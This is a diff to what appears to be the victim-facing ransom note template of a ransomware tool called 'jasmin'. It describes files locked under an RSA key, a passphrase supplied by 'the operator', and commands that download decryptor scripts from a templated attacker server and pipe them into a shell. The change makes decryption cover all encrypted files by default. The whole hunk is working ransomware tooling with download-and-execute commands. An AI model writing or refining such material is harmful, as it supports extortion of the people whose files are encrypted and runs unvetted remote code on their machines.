@@ -19,12 +19,14 @@ protected by an RSA public key.
 
   [ Windows ]  requires PowerShell 7+
   curl.exe -sL {{SERVER_URL}}/payloads/jasmin_unlock.ps1 -o unlock.ps1
-  pwsh -File unlock.ps1 -Server {{SERVER_URL}} -K "<passphrase>" -Paths C:\TargetFolder
+  pwsh -File unlock.ps1 -Server {{SERVER_URL}} -K "<passphrase>"
 
   [ Linux / macOS ]  pure openssl, no dependencies required
-  curl -sL {{SERVER_URL}}/payloads/jasmin_unlock.sh | sh -s {{SERVER_URL}} "<passphrase>" <target_folder>
+  curl -sL {{SERVER_URL}}/payloads/jasmin_unlock.sh | sh -s {{SERVER_URL}} "<passphrase>"
 
-  The passphrase and target folder are provided by the operator.
+  Both commands decrypt ALL encrypted files by default.
+  To limit the scope, append the folders you want: ... "<passphrase>" /data /home
+  The passphrase is provided by the operator.
 
 ✅ SHA-256 integrity verification guarantees every file is restored
    to its exact original state.
